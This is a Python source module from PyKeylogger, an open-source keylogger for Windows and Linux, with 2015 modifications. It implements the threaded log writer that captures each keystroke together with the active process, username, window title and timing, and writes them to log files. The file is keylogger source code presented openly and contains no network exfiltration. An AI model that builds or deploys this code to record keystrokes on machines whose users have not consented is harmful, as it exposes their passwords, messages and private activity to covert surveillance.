# !/usr/bin/env python
# -*- coding: utf-8 -*-

##############################################################################
#
# PyKeylogger: Simple Python Keylogger for Windows
# Copyright (C) 2009  nanotube@users.sf.net
#
# http://pykeylogger.sourceforge.net/
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 3
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
# 2015 modifications by Roxana Lafuente <roxana.lafuente@gmail.com>
##############################################################################

from myutils import (to_unicode, get_username)
from Queue import Queue, Empty
import os
import os.path
import logging
import time
import sys

if os.name == 'posix':
    pass
elif os.name == 'nt':
    import win32api
    import win32con
    import win32process
else:
    print "OS is not recognised as windows or linux"
    sys.exit()

from baseeventclasses import (FirstStageBaseEventClass,
                              SecondStageBaseEventClass)

from constants import ELIST, EVENTLISTSIZE, LINE_SEPARATOR, DATA_SEPARATOR


class DetailedLogWriterFirstStage(FirstStageBaseEventClass):
    '''
        Standard detailed log writer, first stage.

        Grabs keyboard events, finds the process name and username, then
        passes the event on to the second stage.
    '''

    def __init__(self, username, *args, **kwargs):

        FirstStageBaseEventClass.__init__(self, username, *args, **kwargs)
        self.task_function = self.process_event

    def process_event(self):
        try:
            # Need the timeout so that thread terminates properly when exiting
            event = self.q.get(timeout=0.05)
            # Ahora quiero guardar en el log el tiempo en que se aprieta y
            # suelta una tecla.
            process_name = self.get_process_name(event)
            # See if the program is in the no-log list.
            loggable = self.needs_logging(event, process_name)
            if not loggable:
                self.logger.debug("not loggable, we are outta here\n")
                return
            try:
                self.logger.debug("loggable, lets log it. key: %s" %
                                  to_unicode(event.Key))
            except AttributeError:
                # Era un mouse event.
                return

            username = get_username()

            self.sst_q.put((process_name, username, event))

        except Empty:
            pass  # let's keep iterating
        except:
            self.logger.debug("some exception was caught in "
                              "the logwriter loop...\nhere it is:\n",
                              exc_info=True)
            pass  # let's keep iterating

    def needs_logging(self, event, process_name):
        '''
            This function returns False if the process name associated with an
            event is listed in the noLog option, and True otherwise.
        '''

        not_logged = self.subsettings['General']['Applications Not Logged']
        not_logged.split(';')
        if self.subsettings['General']['Applications Not Logged'] != 'None':
            for path in not_logged:
                # We use os.stat instead of comparing strings due to multiple
                # possible representations of a path.
                if os.stat(path) == os.stat(process_name) and \
                        os.path.exists(path):
                    return False
        return True

    def get_process_name(self, event):
        '''
            Acquire the process name from the window handle for use in the log
            filename.
        '''
        if os.name == 'nt':
            hwnd = event.Window
            try:
                tid, pid = win32process.GetWindowThreadProcessId(hwnd)

                mypyproc = win32api.OpenProcess(win32con.PROCESS_ALL_ACCESS,
                                                False, pid)
                procname = win32process.GetModuleFileNameEx(mypyproc, 0)
                return procname
            except:
                # this happens frequently enough - when the last event caused
                # the closure of the window or program.
                # so we just return a nice string and don't worry about it.
                return "noprocname"
        elif os.name == 'posix':
            return to_unicode(event.WindowProcName)

    def spawn_second_stage_thread(self):
        self.sst_q = Queue(0)
        self.sst = DetailedLogWriterSecondStage(self.username, self.dir_lock,
                                                self.sst_q, self.loggername)


class DetailedLogWriterSecondStage(SecondStageBaseEventClass):

    def __init__(self, dir_lock, *args, **kwargs):
        SecondStageBaseEventClass.__init__(self, dir_lock, *args, **kwargs)

        self.task_function = self.process_event

        # Initialize our eventlist to something.
        self.eventlist = range(EVENTLISTSIZE)

        if self.subsettings['General']['Log Key Count'] is True:
            self.eventlist.append(EVENTLISTSIZE)

        self.logger = logging.getLogger(self.loggername)

        # For brevity.
        self.field_sep = \
            self.subsettings['General']['Log File Field Separator']

    def process_event(self):
        try:
            # Need the timeout so that thread terminates properly when exiting.
            (process_name, username, event) = self.q.get(timeout=0.05)

            eventlisttmp = [
                # date
                to_unicode(time.strftime('%Y%m%d')),
                # time
                to_unicode(time.strftime('%H%M')),
                # process name
                # (full path on windows, just name on linux)
                to_unicode(process_name).replace(self.field_sep,
                                                 '[sep_key]'),
                # window handle
                to_unicode(event.Window),
                # username
                to_unicode(username).replace(self.field_sep,
                                             '[sep_key]'),
                # window title
                to_unicode(event.WindowName).replace(self.field_sep, '[sep_key]')]

            if self.subsettings['General']['Log Key Count'] is True:
                eventlisttmp.append('1')
            eventlisttmp.append(to_unicode(self.parse_event_value(event)))

            eventlists_are_equal = self.eventlist[:EVENTLISTSIZE-1] == \
                eventlisttmp[:EVENTLISTSIZE-1]
            if (self.subsettings['General']['Limit Keylog Field Size'] == 0 or
                    (len(self.eventlist[-1]) + len(eventlisttmp[-1])) <
                    self.settings['General']['Limit Keylog Field Size']) and \
                    eventlists_are_equal:

                # Append char to log.
                self.eventlist[-1] = self.eventlist[-1] + eventlisttmp[-1]
                # increase stroke count
                if self.subsettings['General']['Log Key Count'] is True:
                    self.eventlist[-2] = str(int(self.eventlist[-2]) + 1)
            else:
                self.write_to_logfile()
                self.eventlist = eventlisttmp
        except Empty:
            # Check if the minute has rolled over, if so, write it out
            if self.eventlist[:2] != range(2) and \
                self.eventlist[:2] != [to_unicode(time.strftime('%Y%m%d')),
                                       to_unicode(time.strftime('%H%M'))]:
                self.write_to_logfile()
                self.eventlist = ELIST  # blank it out after writing
        except:
            self.logger.debug("some exception was caught in the logwriter loop...\nhere it is:\n", exc_info=True)

    def parse_event_value(self, event):
        '''
            Pass the event ascii value through the requisite filters.
            Returns the result as a string.
        '''
        key = str(event.Key)
        if os.name == 'posix':
            npchrstr = str(event.Time) + DATA_SEPARATOR + key + DATA_SEPARATOR
            npchrstr += str(event.MessageName) + DATA_SEPARATOR + str(event.MouseX)
            npchrstr += DATA_SEPARATOR + str(event.MouseY) + LINE_SEPARATOR
        elif os.name == 'nt':
            npchrstr = str(event.Time) + DATA_SEPARATOR + key + DATA_SEPARATOR
            npchrstr += str(event.MessageName) + LINE_SEPARATOR

        return(npchrstr)

    def write_to_logfile(self):
        '''
            Write the latest eventlist to logfile in one delimited line.
        '''
        if self.eventlist[:EVENTLISTSIZE] != ELIST:
            try:
                line = to_unicode(self.field_sep).join(self.eventlist)
                self.logger.info(line)
            except:
                self.logger.debug(to_unicode(self.eventlist),
                                  exc_info=True)
                pass  # keep going, even though this doesn't get logged...

    def cancel(self):
        '''
            Override this to make sure to write any remaining info to log.
        '''
        self.write_to_logfile()
        SecondStageBaseEventClass.cancel(self)
